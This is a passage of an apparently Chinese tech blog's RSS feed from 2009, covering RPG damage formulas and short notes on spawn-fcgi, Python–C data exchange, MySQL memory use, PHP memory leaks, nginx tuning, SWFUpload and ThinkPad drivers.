RPG和SRPG的区别： 跟RPG不同，SRPG往往会要求对损伤有比较精确的计算。损伤值如果由系数型计算，能比较方便的产生很大的损伤数值，但同时也会给喜欢精确计算的玩家带来一定的麻烦。 不过作为SRPG的FFT使用的也是这样的系数式。出现在FFT中的武器攻击力和人物的AP值（相当于系数）都很小，整个流程中基本都是在几到十几的范围。
简化型&amp;amp;综合型： 之前提到过有简化了防御力，将人物防御力去掉的损伤式。 不过更有直接把防御力都去掉，损伤式只剩攻击力的类型。 FFT便是没有防御力概念的系数型，防御的作用是增加HP。 不过游戏中的实际公式除了攻击力、防御力这些最基本的概念外，往往还要加上很多的附加项。 其实上面这样的分类是十分不严谨的。 FM4没有防御力的概念，也没有人物能力值的修正。如果按上面的分类，将是最简化的形式： 损伤＝武器攻击力 但实际的公式，却有着很多其他的修正项： 损伤＝武器攻击力×武器等级修正×属性修正×特技修正×Chain修正×格斗出力修正×敌方技能修正×（1＋RND） 像这样每项系数相乘的公式还是很容易理解的。不过有更多的情况是在不同地方有相加也有相乘的复合公式。下面我们具体看看几个损伤公式的例子。
FFTA： 损伤＝武器攻击力×（总武攻－敌总武防/2）/100 总武功＝人物攻击力＋武器攻击力 总武防＝人物防御力＋防具防御力 FFTA的损伤式比较特别的地方是，武器攻击力在计算中使用了两次，其作用被提升到了最重要的地位。武器攻击力间的差别很大，由最低的十几，到最高的87，整整相差了好几倍。而防具的防御力，仅仅只能作为跟人物防御力相加后的系数项的一部分，之后还被除2，完全放到了被忽略的地位。人物间因为不同职业成长而产生的人物攻击力差距，也不能很好的得到体现。
TO： [（人物攻击力＋武器攻击力）×攻击系数＋人物防御力×防御系数]×抵抗系数 TO的损伤式是出名的复杂的，不过稍加归纳后，也可以写成如上的简洁形式。最终的损伤值还要加上乱数和攻击方式的影响。 人物攻击力一项，是：人物STR＋人物DEX/2 武器攻击力是：武器STR＋武器DEX/2 人物防御力是：人物VIT＋人物STR/2 两个系数的影响项很多，攻击系数有：地形修正、地形属性修正、必杀修正、武器属性修正、天候－性格修正、天候抵抗、得意武器修正、对龙效果、恐怖效果、支援效果，如此多项。防御系数则少一些。影响项很多，但一般比较需要留意的也就是地形效果、武器属性等几项而已。 抵抗系数指RES，有防具的影响，也有攻击方武器属性和被攻击方人物属性的影响，作用是对整个基本损伤值按一定比例的减轻。 感觉TO的公式更多的是从设计的角度而不是数值的角度去考虑，数值的平衡性也确实有着一些问题。比如武器的攻击力是和人物攻击力直接相加，但武器攻击力一般只有3、40左右，人物攻击力后期却高达数百，使得选择武器时武器的攻击力完全放到了被忽略的位置上。
FF6： FF6的魔法损伤式很FF5的很类似，但物理损伤式却出奇地复杂： 基本损伤＝武器攻击力＋（等级^2×（武器攻击力＋人物力气×2）/256×3/2） 损伤＝基本损伤×防御修正 防御修正＝（255－防御力）/256＋1 武器攻击力的最大值为255，而人物力气×2的最大值也仅255。这样的公式使得等级对损伤值的影响十分大。而任凭基本损伤一项再大，如果防御力有255，防御修正项也会使得攻击基本无效化。这点其实跟TO的防具防御力处理是很类似的。
VP： 损伤＝[（人物攻击力＋武器攻击力）×武器的攻击信赖度－敌方防御力]×各种修正值 本身就很高的武器攻击力，加上各种系数相乘后达到很夸张的损伤值，是VP的一大特色。 VP后期也有着明显的人物攻击力和武器攻击力不平衡的问题。武器攻击力过万，而人物攻击力不过一千多，人物间的攻击力差距更是被忽略……</description>
    </item>
    
    <item>
      <title>spawn-fcgi: no fastcgi application given</title>
      <link>http://example.org/2009/08/16/spawn-fcgi-no-fastcgi-application-given/</link>
      <pubDate>Sun, 16 Aug 2009 17:32:36 +0000</pubDate>
      
      <guid>http://example.org/2009/08/16/spawn-fcgi-no-fastcgi-application-given/</guid>
      <description>刚装完spawn-fcgi 起动会遇到这个错误. 修改 spawn-fcgi 起动脚本 spawn_fcgi_app 加个 php-cgi 地址，或在rc.conf 加上也一样</description>
    </item>
    
    <item>
      <title>开始学习python</title>
      <link>http://example.org/2009/08/16/e5bc80e5a78be5ada6e4b9a0python/</link>
      <pubDate>Sun, 16 Aug 2009 15:55:29 +0000</pubDate>
      
      <guid>http://example.org/2009/08/16/e5bc80e5a78be5ada6e4b9a0python/</guid>
      <description>原来一直想学这个，但是没有机会，在新项目中的聊天室，打算用python+flex+socket 来实现，效率还不知道，正好顺便学学 python ,看它的语法，感觉还是很简洁的，不过习惯php 了，老是想以 php 的写法来写，这个比较郁闷了!</description>
    </item>
    
    <item>
      <title>关于C和Python之间通信的方法</title>
      <link>http://example.org/2009/08/16/e585b3e4ba8ece5928cpythone4b98be997b4e9809ae4bfa1e79a84e696b9e6b395/</link>
      <pubDate>Sun, 16 Aug 2009 15:47:52 +0000</pubDate>
      
      <guid>http://example.org/2009/08/16/e585b3e4ba8ece5928cpythone4b98be997b4e9809ae4bfa1e79a84e696b9e6b395/</guid>
      <description>这些天在做一个项目，前端使用python来作，便于快速开发，底层使用C来写，效率高，速度快。这样就牵扯到二者之间的通信问题。我查了相关文档，发现有以下几种解决方式：
使用标准的数据表示形式，比如xml或者xdr，然后在C和python两端都有自己的相应的库，可以对这些数据进行解释，自然就可以通信了。 在C中定义一个结构对象，把它打包成二进制形式（python把它作为字符串来解释），然后使用python中的struct模块的pack函数来解析，这样就牵扯到一个解析格式串的问题，一个简单的方式是在c和python两端定义对应的两套数据结构，分别有自己的pack和unpack函数，它们可以对中间结果－－－二进制串，进行解析，这样就可以实现通信了。在python那一端还可以使用array模块，处理类型统一的数据，特别方便，有时候比用struct模块要爽！ 使用一个xml文件将C中定义的结构都包含进去，然后在python那一端进行解析这个xml文件，自然就知道如何对每个C中的struct对象进行解析了，这样扩展性好一些。 使用第三方的库，我所知道的有boost.python和ctypes，具体怎样我也没有是用。 我在实现的时候使用了第2种方式，下面举个例子：
在c中有这样一个结构：
typedef struct test_tag { int a; int b; }test_t; char* test_pack(test_t* ptr){ char * p=NULL; p = (char *) malloc(sizeof(test_t)); memcpy(p,ptr,sizeof(test_t)); return p; } test_t* test_unpack(char* ptr){ test_t* p=NULL; p=(test_t *)malloc(sizeof(test_t)); memcpy(p,ptr,sizeof(test_t)); return p; } 在python端有这样的对应数据结构：
class test: format=&#39;2i&#39; members=(&#39;a&#39;,&#39;b&#39;) def __init__(self): for item in test.members: self.__dict__[item]=-1 def pack(self,order=&#39;@&#39;): return struct.pack(order+test.format,self.a,self.b) def pack2(self,order=&#39;@&#39;): bin=array.array(&#39;l&#39;) for item in test.members: bin.append(self.__dict__[item]) if (sys.byteorder==&#39;little&#39; and order==&#39;&amp;gt;&#39;) or (sys.</description>
    </item>
    
    <item>
      <title>FastCgi 翻译文档</title>
      <link>http://example.org/2009/07/16/fastcgi-e7bfbbe8af91e69687e6a1a3/</link>
      <pubDate>Thu, 16 Jul 2009 16:25:04 +0000</pubDate>
      
      <guid>http://example.org/2009/07/16/fastcgi-e7bfbbe8af91e69687e6a1a3/</guid>
      <description>同事业余时间翻译的，我把它整理了出来，其中绿色的是我没有使用默认值的参数。
IdleTimeout n (300 seconds)
An idle fastcgi application will be terminated after IdleTimeout seconds.
空闲线程将在 n 秒后被终止。
IdleScanInterval n (120 seconds)
The scan interval for idle fastcgi applications.
扫描空闲线程的时间间隔。
BusyTimeout n (300 seconds)
a fastcgi application will be terminated if handing a single request longer than busy timeout.
一个线程被单独占用 n 秒后将被终止。
BusyScanInterval n (120 seconds)
The scan interval for busy timeout fastcgi applications.
扫描繁忙线程的时间间隔。
ErrorScanInterval n (3 seconds)
The scan interval for exit pending fastcgi applications.</description>
    </item>
    
    <item>
      <title>将svnserver 注册为系统服务</title>
      <link>http://example.org/2009/07/07/e5b086svnserver-e6b3a8e5868ce4b8bae7b3bbe7bb9fe69c8de58aa1/</link>
      <pubDate>Tue, 07 Jul 2009 13:27:16 +0000</pubDate>
      
      <guid>http://example.org/2009/07/07/e5b086svnserver-e6b3a8e5868ce4b8bae7b3bbe7bb9fe69c8de58aa1/</guid>
      <description>sc create svn binpath= &amp;ldquo;D:\soft\Subversion\bin\svnserve.exe &amp;ndash;service -r E:\svn\local&amp;rdquo; displayname= &amp;ldquo;Subversion Server&amp;rdquo; depend= Tcpip start= auto
刚重装完系统记录一下，</description>
    </item>
    
    <item>
      <title>Thinkpad R61I 驱动下载及安装方法 for windows 2003</title>
      <link>http://example.org/2009/07/07/thinkpad-r61i-e9a9b1e58aa8e4b88be8bdbde58f8ae5ae89e8a385e696b9e6b395-for-windows-2003/</link>
      <pubDate>Tue, 07 Jul 2009 06:09:53 +0000</pubDate>
      
      <guid>http://example.org/2009/07/07/thinkpad-r61i-e9a9b1e58aa8e4b88be8bdbde58f8ae5ae89e8a385e696b9e6b395-for-windows-2003/</guid>
      <description>驱动下载方法：把下面的链接复制到浏览器地址栏后按回车 &amp;ndash;&amp;gt; 鼠标左键单击页面中.exe结尾的连接 &amp;ndash;&amp;gt; 在新弹出的窗口中选择“FTP”或“HTTP” &amp;ndash;&amp;gt; 鼠标左键单击“I agree”后选择保存。 几点提醒： 1、请不要使用迅雷、快车等第三方下载工具下载驱动，会造成下载不完整无法安装。
2、请尽量按照下列驱动的排列的先后顺序安装。 3、设备管理中常见的未知设备一般为ACPI电源管理器和TPM安全芯片，如果出现未知设备，请首先尝试安装其驱动。 4、GHOST安装的系统有可能存在驱动无法安装的情况，建议不要使用GHOST安装系统。 5、使用GHOST安装系统后如出现小红帽不可用的情况，请在设备管理器中删除“鼠标和其它指针设备”下面有感叹号的设备，然后重启系统，小红帽即可使用。 1,INTEL主板芯片组（设备管理器中显示为：SM BUS控制器）
http://www-307.ibm.com/pc/support/site.wss/document.do?lndocid=MIGR-67818
默认释放路径C:\DRIVERS\WIN\INTELINF\INFINST_AUTOL.EXE 2,NVIDIA显卡驱动：TYPE为（ 7742, 8918）的R61I请安装此款显卡驱动：NVIDIA Quadro NVS 140M / Quadro FX 570M显卡 （设备管理器中显示为：VGA视频控制器）
http://www-307.ibm.com/pc/support/site.wss/document.do?lndocid=MIGR-67924
默认释放路径C:\DRIVERS\WIN\DISPLAY\SETUP.EXE 3,INTEL显卡驱动：TYPE为（7650, 7732, 8932, 8943）的R61I请安装此款显卡驱动：Intel X3100集成显卡（设备管理器中显示为：VGA视频控制器）
http://www-307.ibm.com/pc/support/site.wss/document.do?lndocid=MIGR-67838
默认释放路径C:\DRIVERS\WIN\DISPLAY\SETUP.EXE 4,INTEL千兆以太网卡驱动：TYPE为（7732, 7742, 8918）的R61I请安装INTEL千兆以太网卡 （设备管理器中显示为：以太网控制器）
http://www-307.ibm.com/pc/support/site.wss/document.do?lndocid=MIGR-67829
默认解压路径 C:\DRIVERS\WIN\ETHERNET\APPS\SETUP\SETUPBD\Win32\SetupBD.exe 或C:\DRIVERS\WIN\ETHERNET\APPS\PROSETDX\Win32\DxSetup.EXE
5,Broadcom千兆以太网卡驱动：TYPE为（7650，8942, 8943）的R61I请安装Broadcom千兆以太网卡（设备管理器中显示为：以太网控制器）
http://www-307.ibm.com/pc/support/site.wss/document.do?lndocid=MIGR-58618
默认解压路径 C:\DRIVERS\WIN\ETHERNET\WINXP\IA32 ,在设备管理器中以太网控制器上点右键选择更新驱动程序－&amp;gt;指定位置安装，指定到此目录搜索安装。 或C:\DRIVERS\WIN\ETHERNET\TOOLS\DRVINST\IA32\SETUP.EXE
6,Thinkpad 11b/g无线网卡驱动：TYPE为（7650, 7732, 7742, 8943）的R61I请安装Thinkpad 11b/g无线网卡（设备管理器中显示为：以太网控制器）（部分R61I没有配置无线网卡，不需要安装此驱动程序，请继续安装其他驱动程序）
http://www-307.ibm.com/pc/support/site.wss/document.do?lndocid=MIGR-52527
默认释放路径C:\DRIVERS\WIN\WLLANATH\SETUP.EXE 7,INTEL无线网卡驱动：TYPE为（8918）的R61I请安装INTEL无线网卡 （设备管理器中显示为：网络适配器）（部分R61I没有配置无线网卡，不需要安装此驱动程序，请继续安装其他驱动程序）
http://www-307.ibm.com/pc/support/site.wss/document.do?lndocid=MIGR-62875
默认释放路径C:\DRIVERS\WIN\WLANINT2\XP\Apps\x32\iProInst.EXE 8,声卡KB888111补丁（PCI-DEVICE,KB888111）
http://www-307.ibm.com/pc/support/site.wss/document.do?sitestyle=lenovo&amp;amp;lndocid;=MIGR-65456
默认释放路径：打开下载页面选择第五个简体中文版下载kb888111xp2chs.exe（如您安装的是其他语言版本的WINDOWS系统，请选 择相应语言版本下载安装），下载完后直接双击安装。注意：只有先安装KB888111补丁，才能安装声卡和调制解调器驱动。 9,SoundMax声卡驱动：（TYPE为7732, 7738, 7742, 7743, 7755, 8914, 8918, 8942, 8943的R61I请安装此声卡驱动程序）（设备管理器中显示为：High Definition Audio总线上的音频设备）</description>
    </item>
    
    <item>
      <title>md5crypt</title>
      <link>http://example.org/2009/07/06/md5crypt/</link>
      <pubDate>Mon, 06 Jul 2009 10:33:43 +0000</pubDate>
      
      <guid>http://example.org/2009/07/06/md5crypt/</guid>
      <description>php 版 md5crypt postfix extmail 使用
function md5crypt ($pw) { $MAGIC = &amp;quot;$1$&amp;quot;; $rand = substr (md5 (mt_rand ()), 0, 8); return crypt($pw, &#39;$1$&#39;.$rand.&#39;$&#39;); } </description>
    </item>
    
    <item>
      <title>加快innodb 关闭</title>
      <link>http://example.org/2009/07/03/e58aa0e5bfabinnodb-e585b3e997ad/</link>
      <pubDate>Fri, 03 Jul 2009 14:42:27 +0000</pubDate>
      
      <guid>http://example.org/2009/07/03/e58aa0e5bfabinnodb-e585b3e997ad/</guid>
      <description>mysql&amp;gt; set global innodb_max_dirty_pages_pct = 0;
过半小时再shutdown就快了</description>
    </item>
    
    <item>
      <title>W3C DOM - {setAttribute()}</title>
      <link>http://example.org/2009/06/26/w3c-dom-setattribute/</link>
      <pubDate>Fri, 26 Jun 2009 01:06:35 +0000</pubDate>
      
      <guid>http://example.org/2009/06/26/w3c-dom-setattribute/</guid>
      <description>setAttribute(string name, string value)：增加一个指定名称和值的新属性，或者把一个现有的属性设定为指定的值。
1、setAttribute()的差异 我们经常需要在JavaScript中给Element动态添加各种属性，这可以通过使用setAttribute()来实现，这就涉及到了浏览器的兼容性问题。
var bar = document.getElementById(&amp;quot;foo&amp;quot;); bar.setAttribute(&amp;quot;onclick&amp;quot;, &amp;quot;javascript:alert(&#39;This is a test!&#39;);&amp;quot;); 这里利用setAttribute指定Element的onclick属性，简单，很好理解。但是IE不支持，IE并不是不支持setAttribute这个函数，而是不支持用setAttribute设置某些属性，例如对象属性、集合属性、事件属性，也就是说用setAttribute设置style和onclick 这些属性在IE中是行不通的。为达到兼容各种浏览器的效果，可以用点符号法来设置Element的对象属性、集合属性和事件属性。
document.getElementById(&amp;quot;foo&amp;quot;).className = &amp;quot;fruit&amp;quot;; document.getElementById(&amp;quot;foo&amp;quot;).style.cssText = &amp;quot;color: #00f;&amp;quot;; document.getElementById(&amp;quot;foo&amp;quot;).style.color = &amp;quot;#00f&amp;quot;; document.getElementById(&amp;quot;foo&amp;quot;).onclick= function () { alert(&amp;quot;This is a test!&amp;quot;); } 2、关于class和className class 属性在W3C DOM中扮演着很重要的角色，但由于浏览器差异性仍然存在。使用setAttribute(&amp;ldquo;class&amp;rdquo;, vName)语句动态设置element的class属性在firefox中是行的通的，在IE中却不行。因为使用IE内核的浏览器不认识 &amp;ldquo;class&amp;rdquo;，要改用&amp;quot;className&amp;quot;；同样，firefox 也不认识&amp;quot;className&amp;quot;。所以常用的方法是二者兼备：
element.setAttribute(&amp;quot;class&amp;quot;, vName); element.setAttribute(&amp;quot;className&amp;quot;, vName); // for IE 3、cellspacing和cellpadding 虽然在CSS中存在与cellpadding和cellspacing这两个属性等价的样式属性padding和 border-spacing。然而，浏览器对这些样式属性支持的不一致，有时仍会使用cellpadding和 cellspacing来调整表格的间距。不过，在firefox中有效的setAttribute(&amp;ldquo;cellpadding&amp;rdquo;, value)到了IE下就不行了，必须改成cellPadding才可以(注意：p大写)。幸好firefox也支持setAttribute(&amp;ldquo;cellPadding&amp;rdquo;, value)。所以二者兼容的代码是：
element.setAttribute(&amp;quot;cellSpacing&amp;quot;, value); element.setAttribute(&amp;quot;cellPadding&amp;quot;, value); </description>
    </item>
    
    <item>
      <title>rpmbuild command not found</title>
      <link>http://example.org/2009/06/24/rpmbuild-command-not-found/</link>
      <pubDate>Wed, 24 Jun 2009 04:29:29 +0000</pubDate>
      
      <guid>http://example.org/2009/06/24/rpmbuild-command-not-found/</guid>
      <description>rpmbuild command not found
安装 rpm-build 组件
yum install rpm-build </description>
    </item>
    
    <item>
      <title>Extmail1.1登录显示：Unix::Syslog not found</title>
      <link>http://example.org/2009/06/23/extmail1-1e799bbe5bd95e698bee7a4baefbc9aunixsyslog-not-found/</link>
      <pubDate>Tue, 23 Jun 2009 07:28:18 +0000</pubDate>
      
      <guid>http://example.org/2009/06/23/extmail1-1e799bbe5bd95e698bee7a4baefbc9aunixsyslog-not-found/</guid>
      <description>Unix::Syslog not found, please install it first! (in cleanup) Undefined subroutine &amp;amp;Ext;::Logger::do_closelog called at /var/www/extsuite/extmail/libs/Ext/Logger.pm line 87. 没装perl-Unix-Syslog包,
安装方法
perl -MCPAN -e shell cpan&amp;gt;install Unix::Syslog </description>
    </item>
    
    <item>
      <title>spawn-fcgi 独立出来了,不错</title>
      <link>http://example.org/2009/06/19/spawn-fcgi-e78bace7ab8be587bae69da5e4ba86e4b88de99499/</link>
      <pubDate>Fri, 19 Jun 2009 06:56:44 +0000</pubDate>
      
      <guid>http://example.org/2009/06/19/spawn-fcgi-e78bace7ab8be587bae69da5e4ba86e4b88de99499/</guid>
      <description>原来一直用php-fpm ,但是更新好像不太及时,上次改了半天ports 才通过编译
/usr/ports/www/spawn-fcgi 以后可以用这个了,但重要载入php.ini 要重起</description>
    </item>
    
    <item>
      <title>PHP对象相互引用的内存溢出</title>
      <link>http://example.org/2009/06/10/phpe5afb9e8b1a1e79bb8e4ba92e5bc95e794a8e79a84e58685e5ad98e6baa2e587ba/</link>
      <pubDate>Wed, 10 Jun 2009 16:22:57 +0000</pubDate>
      
      <guid>http://example.org/2009/06/10/phpe5afb9e8b1a1e79bb8e4ba92e5bc95e794a8e79a84e58685e5ad98e6baa2e587ba/</guid>
      <description>使用脚本语言最大的好处之一就是可利用其拥有的自动垃圾回收机制（释放内存）。你不需要在使用完变量后做任何释放内存的处理，PHP会帮你完成。
当然，我们可以按自己的意愿调用 unset() 函数来释放内存，但通常不需要这么做。
不过在PHP里，至少有一种情况内存不会得到自动释放，即便是手动调用 unset()。详情可考：http://bugs.php.net/bug.php?id=33595。
问题症状 如果两个对象之间存在着相互引用的关系，如“父对象-子对象”，对父对象调用 unset() 不会释放在子对象中引用父对象的内存（即便父对象被垃圾回收，也不行）。
有些糊涂了？我们来看下面的这段代码：
bar = new Bar($this); } } class Bar { function __construct($foo = null) { $this-&amp;gt;foo = $foo; } } while (true) { $foo = new Foo(); unset($foo); echo number_format(memory_get_usage()) . &amp;quot;\n&amp;quot;; } ?&amp;gt; 运行这段代码，你会看到内存使用率越来越高越来越高，直到用光光。
&amp;hellip;33,551,61633,551,97633,552,33633,552,696PHP Fatal error: Allowed memory size of 33554432 bytes exhausted(tried to allocate 16 bytes) in memleak.php on line 17对大部分PHP程序员来讲这种情况不算是什么问题。
可如果你在一个长期运行的代码中使用到了一大堆相互引用的对象，尤其是在对象相对较大的情况下，内存会迅速地消耗殆尽。
Userland解决方案 虽然有些乏味、不优雅，但之前提到的 bugs.php.net 链接中提供了一个解决方案。
这个方案在释放对象前使用一个 destructor 方法以达到目的。Destructor 方法可将所有内部的父对象引用全部清除，也就是说可以将这部分本来会溢出的内存释放掉。</description>
    </item>
    
    <item>
      <title>js控制 overflow-y 属性</title>
      <link>http://example.org/2009/06/07/jse68ea7e588b6-overflow-y-e5b19ee680a7/</link>
      <pubDate>Sun, 07 Jun 2009 08:13:56 +0000</pubDate>
      
      <guid>http://example.org/2009/06/07/jse68ea7e588b6-overflow-y-e5b19ee680a7/</guid>
      <description>原来是可以用js控制的，原来还以为不行呢，
document.getElementById(&#39;overflow&#39;).style.overflowY = &#39;scroll&#39;; </description>
    </item>
    
    <item>
      <title>nginx freebsd 官方网站优化</title>
      <link>http://example.org/2009/05/31/nginx-freebsd-e5ae98e696b9e7bd91e7ab99e4bc98e58c96/</link>
      <pubDate>Sun, 31 May 2009 22:13:29 +0000</pubDate>
      
      <guid>http://example.org/2009/05/31/nginx-freebsd-e5ae98e696b9e7bd91e7ab99e4bc98e58c96/</guid>
      <description>OS &amp;amp; Hardware FreeBSD 7.1 AMD64, dual-core CPU 4GB RAM Purpose Web server &amp;amp; reverse proxy Load description 45K inactive keep-alive connections HTTP request is about 5,000 req/s, mostly small static files, all are cached by VM System config /boot/loader.conf:
vm.kmem_size=1844M kern.maxbcache=64M kern.ipc.maxpipekva=4M /etc/sysctl.conf:
kern.ipc.nmbjumbop=192000 kern.ipc.nmbclusters=229376 kern.ipc.maxsockets=204800 net.inet.tcp.maxtcptw=163840 kern.maxfiles=204800 kern.ipc.somaxconn=4096 Retrieved from &amp;ldquo;http://wiki.nginx.org/FreeBSDOptimizations&amp;quot;</description>
    </item>
    
    <item>
      <title>SWFUpload V2</title>
      <link>http://example.org/2009/05/20/swfupload-v2/</link>
      <pubDate>Wed, 20 May 2009 08:49:18 +0000</pubDate>
      
      <guid>http://example.org/2009/05/20/swfupload-v2/</guid>
      <description>Flash Player 10的安全机制更严格，类似打开文件上传的对话框的操作，一定需要用户交互才触发，如果用脚本触发，会报#2176的运行时错误。
void selectFile() 不赞成使用，不兼容Flash Player 10 弹出flash的文件选择对话框，只能选择单个文件。
void selectFiles() 不赞成使用，不兼容Flash Player 10 弹出flash的文件选择对话框，可一次性选择多个文件。
flash_width 固定值：1px (v2.1.0已删除) 设置插入flash影片的HTML元素容器的宽度。如果此设置小于1像素，一些浏览器会出现功能异常。 因此该值在v2.1.0中删除了自定义设置，默认设置为1像素了。
flash_height 固定值：1px (v2.1.0已删除) 设置插入flash影片的HTML元素容器的高度。如果此设置小于1像素，一些浏览器会出现功能异常。 因此该值在v2.1.0中删除了自定义设置，默认设置为1像素了。
flash_color 默认值：#FFFFFF (v2.2.0已删除) 设置HTML页面中的flash背景色，默认为#FFFFFF
prevent_swf_caching 默认值：true (v2.2.0新增)该布尔值设置是否在Flash URL后添加一个随机值，用来防止浏览器缓存了该SWF影片。这是为了解决一些基于IE-engine的浏览器上的出现一个BUG。
提醒：SWFUpload是直接在flash_url后添加了一个swfuploadrnd的随机参数。如果你给定的flash_url中已经存在了GET类型的参数，那么就会出现两个问号连接符导致错误。
button_placeholder_id 默认值：null (v2.2.0新增) 该必要参数指定了swfupload.swf将要替换的页面内的DOM元素的ID值。当对应的DOM元素被替换为SWF元素时，SWF的容器会被添加一个名称为&amp;quot;swfupload&amp;quot;的样式选择器供CSS自定义使用。
button_image_url 默认值：空字符串 (v2.2.0新增) V2.2.0版最大的改变就是引入了一个按钮到SWF中，利用该参数可以设置一个相对于该swf文件或者是绝对地址的图片（或者是SWF），作为按钮的UI展现。所有FLASH支持的图片类型都可以使用（gif,jpg,png,或者是一个SWF）。 该按钮图片需要经过一定规则（CSS Sprite）的处理。按钮图片中需要包括按钮的4个状态，从上到下依次是normal, hover, down/click, disabled.(可以参照官方demo中的图片)
button_width 默认值：1 (v2.2.0新增) 设置该SWF的宽度属性。
button_height 默认值：1 (v2.2.0新增)设置该SWF的高度属性（按钮图片高度的1/4）
button_text 默认值：空字符串 (v2.2.0新增) 该属性设置Flash Button中显示的文字，支持HTML。HTML文本的样式可以通过CSS选择器并配合button_text_style参数来设置。关于Flash文本对HTML的支持详细可见 Adobe&amp;rsquo;s Flash documentation。
button_text_style 默认值：&amp;ldquo;color: #000000; font-size: 16pt;&amp;rdquo; (v2.2.0新增)此参数配合button_text参数，可以通过CSS样式来设置Flash Button中的文字样式。关于Flash文本对CSS的支持详细可见Adobe&amp;rsquo;s Flash documentation</description>
    </item>
    
    <item>
      <title>MySQL内存使用分析-全局共享[转]</title>
      <link>http://example.org/2009/05/15/mysqle58685e5ad98e4bdbfe794a8e58886e69e90-e585a8e5b180e585b1e4baabe8bdac/</link>
      <pubDate>Fri, 15 May 2009 01:59:40 +0000</pubDate>
      
      <guid>http://example.org/2009/05/15/mysqle58685e5ad98e4bdbfe794a8e58886e69e90-e585a8e5b180e585b1e4baabe8bdac/</guid>
      <description>全局共享内则主要是 MySQLInstance（mysqld进程）以及底层存储引擎用来暂存各种全局运算及可共享的暂存信息，如存储查询缓存的 QueryCache，缓存连接线程的 Thread Cache，缓存表文件句柄信息的 Table Cache，缓存二进制日志的 BinLogBuffer， 缓存 MyISAM 存储引擎索引键的 Key Buffer以及存储 InnoDB 数据和索引的 InnoDB BufferPool 等等。下面针对 MySQL 主要的共享内存进行一个简单的分析。 查询缓存（Query Cache）：查询缓存是 MySQL 比较独特的一个缓存区域，用来缓存特定Query 的结果集（Result Set）信息，且共享给所有客户端。通过对 Query 语句进行特定的 Hash 计算之后与结果集对应存放在Query Cache 中，以提高完全相同的 Query 语句的相应速度。当我们打开 MySQL 的 Query Cache 之后，MySQL接收到每一个 SELECT 类型的 Query 之后都会首先通过固定的 Hash 算法得到该 Query 的 Hash 值，然后到 QueryCache 中查找是否有对应的 Query Cache。如果有，则直接将 Cache的结果集返回给客户端。如果没有，再进行后续操作，得到对应的结果集之后将该结果集缓存到 Query Cache中，再返回给客户端。当任何一个表的数据发生任何变化之后，与该表相关的所有 Query Cache 全部会失效，所以 Query Cache对变更比较频繁的表并不是非常适用，但对那些变更较少的表是非常合适的，可以极大程度的提高查询效率，如那些静态资源表，配置表等等。为了尽可能高效的利用 Query Cache，MySQL 针对 Query Cache 设计了多个 query_cache_type 值和两个 QueryHint：SQL_CACHE 和 SQL_NO_CACHE。当 query_cache_type 设置为0（或者 OFF）的时候不使用Query Cache，当设置为1（或者 ON）的时候，当且仅当 Query 中使用了 SQL_NO_CACHE 的时候 MySQL 会忽略Query Cache，当 query_cache_type 设置为2（或者DEMAND）的时候，当且仅当Query 中使用了SQL_CACHE 提示之后，MySQL 才会针对该 Query 使用 Query Cache。可以通过 query_cache_size来设置可以使用的最大内存空间。 连接线程缓存（Thread Cache）：连接线程是 MySQL为了提高创建连接线程的效率，将部分空闲的连接线程保持在一个缓存区以备新进连接请求的时候使用，这尤其对那些使用短连接的应用程序来说可以极大的提高创建连接的效率。当我们通过 thread_cache_size设置了连接线程缓存池可以缓存的连接线程的大小之后，可以通过(Connections - Threads_created) /Connections * 100% 计算出连接线程缓存的命中率。注意，这里设置的是可以缓存的连接线程的数目，而不是内存空间的大小。 表缓存（Table Cache）：表缓存区主要用来缓存表文件的文件句柄信息，在MySQL5.</description>
    </item>
    
    <item>
      <title>MySQL内存使用分析-线程独享[转]</title>
      <link>http://example.org/2009/05/15/mysqle58685e5ad98e4bdbfe794a8e58886e69e90-e7babfe7a88be78bace4baabe8bdac/</link>
      <pubDate>Fri, 15 May 2009 01:58:26 +0000</pubDate>
      
      <guid>http://example.org/2009/05/15/mysqle58685e5ad98e4bdbfe794a8e58886e69e90-e7babfe7a88be78bace4baabe8bdac/</guid>
      <description>对于任何一个数据库管理系统来说，内存的分配使用绝对可以算的上是其核心之一了，所以很多希望更为深入了解某数据库管理系统的人，都会希望一窥究竟，我也不例外。 从内存的使用方式MySQL 数据库的内存使用主要分为以下两类
线程独享内存
全局共享内存
今天这篇文章暂时先分析 MySQL 中主要的 “线程独享内存” 的。
在 MySQL 中，线程独享内存主要用于各客户端连接线程存储各种操作的独享数据，如线程栈信息，分组排序操作，数据读写缓冲，结果集暂存等等，而且大多数可以通过相关参数来控制内存的使用量。
线程栈信息使用内存(thread_stack)：主要用来存放每一个线程自身的标识信息，如线程id，线程运行时基本信息等等，我们可以通过 thread_stack 参数来设置为每一个线程栈分配多大的内存。
排序使用内存(sort_buffer_size)：MySQL用此内存区域进行排序操作（filesort），完成客户端的排序请求。当我们设置的排序区缓存大小无法满足排序实际所需内存的时候，MySQL会将数据写入磁盘文件来完成排序。由于磁盘和内存的读写性能完全不在一个数量级，所以sort_buffer_size参数对排序操作的性能影响绝对不可小视。排序操作的实现原理请参考：MySQL Order By 的实现分析。
Join操作使用内存(join_buffer_size)：应用程序经常会出现一些两表（或多表）Join的操作需求，MySQL在完成某些 Join 需求的时候（all/indexjoin），为了减少参与Join的“被驱动表”的读取次数以提高性能，需要使用到 Join Buffer 来协助完成 Join操作（具体Join 实现算法请参考：MySQL 中的 Join 基本实现原理）。当 Join Buffer 太小，MySQL 不会将该 Buffer 存入磁盘文件，而是先将Join Buffer中的结果集与需要 Join的表进行 Join 操作，然后清空 Join Buffer 中的数据，继续将剩余的结果集写入此 Buffer中，如此往复。这势必会造成被驱动表需要被多次读取，成倍增加 IO 访问，降低效率。
顺序读取数据缓冲区使用内存(read_buffer_size)：这部分内存主要用于当需要顺序读取数据的时候，如无发使用索引的情况下的全表扫描，全索引扫描等。在这种时候，MySQL按照数据的存储顺序依次读取数据块，每次读取的数据快首先会暂存在read_buffer_size中，当 buffer空间被写满或者全部数据读取结束后，再将buffer中的数据返回给上层调用者，以提高效率。
随机读取数据缓冲区使用内存(read_rnd_buffer_size)：和顺序读取相对应，当MySQL进行非顺序读取（随机读取）数据块的时候，会利用这个缓冲区暂存读取的数据。如根据索引信息读取表数据，根据排序后的结果集与表进行Join等等。总的来说，就是当数据块的读取需要满足一定的顺序的情况下，MySQL 就需要产生随机读取，进而使用到 read_rnd_buffer_size参数所设置的内存缓冲区。
